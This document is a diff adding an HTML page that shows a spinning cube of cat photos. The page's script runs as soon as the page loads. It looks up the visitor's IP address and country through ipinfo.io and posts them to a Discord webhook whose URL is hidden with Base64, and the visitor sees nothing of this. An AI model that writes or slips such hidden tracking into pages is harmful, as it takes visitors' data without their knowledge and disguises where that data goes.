@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spinning Cat Cube with Fake Webhook</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            perspective: 1000px;
+        }
+
+        .cube {
+            width: 200px;
+            height: 200px;
+            position: relative;
+            transform-style: preserve-3d;
+            animation: spin 10s infinite linear;
+        }
+
+        .face {
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            background-size: cover;
+            background-position: center;
+            border: 2px solid #333;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .front  { transform: translateZ(100px); background-image: url('https://cataas.com/cat?width=200&height=200'); }
+        .back   { transform: rotateY(180deg) translateZ(100px); background-image: url('https://cataas.com/cat?width=200&height=200&type=square'); }
+        .right  { transform: rotateY(90deg) translateZ(100px); background-image: url('https://cataas.com/cat?width=200&height=200&type=wide'); }
+        .left   { transform: rotateY(-90deg) translateZ(100px); background-image: url('https://cataas.com/cat?width=200&height=200&type=tall'); }
+        .top    { transform: rotateX(90deg) translateZ(100px); background-image: url('https://cataas.com/cat?width=200&height=200&type=small'); }
+        .bottom { transform: rotateX(-90deg) translateZ(100px); background-image: url('https://cataas.com/cat?width=200&height=200&type=medium'); }
+
+        @keyframes spin {
+            from { transform: rotateY(0deg) rotateX(0deg); }
+            to { transform: rotateY(360deg) rotateX(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="cube">
+        <div class="face front"></div>
+        <div class="face back"></div>
+        <div class="face right"></div>
+        <div class="face left"></div>
+        <div class="face top"></div>
+        <div class="face bottom"></div>
+    </div>
+
+    <script>
+        // Function to fetch the user's IP and country using ipinfo.io
+        async function getUserInfo() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country: data.country
+                };
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return null;
+            }
+        }
+
+        // Function to send data to Discord webhook
+        async function sendToDiscord(ip, country) {
+            // Obfuscated fake webhook URL (encoded in Base64)
+            const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1MDQ4MDAwMjU5MTg4NzQ2MS9MVmpROFZTWDdfTWo1NmhXYlhXakYtNE4zVXZVbHpkbXcwR0syM1hfR0dndkhhVEE4ZmFCMGFTN2M2TGVyNVU4YmN2Sw==');
+
+            // Get country flag emoji
+            const flagEmoji = getCountryFlagEmoji(country);
+
+            // Prepare the message
+            const message = {
+                content: `New visitor!\nIP: ${ip}\nCountry: ${country} ${flagEmoji}`
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+                console.log('Data sent to Discord webhook');
+            } catch (error) {
+                console.error('Error sending data to Discord:', error);
+            }
+        }
+
+        // Function to get country flag emoji
+        function getCountryFlagEmoji(countryCode) {
+            // Convert country code to flag emoji
+            return String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => 0x1F1A5 + c.charCodeAt(0)));
+        }
+
+        // Main function to collect data and send to Discord
+        (async () => {
+            const userInfo = await getUserInfo();
+            if (userInfo) {
+                await sendToDiscord(userInfo.ip, userInfo.country);
+            }
+        })();
+    </script>
+</body>
+</html><ALOASK-SEPARATE-EDITORS><ALOASK-SEPARATE-EDITORS>
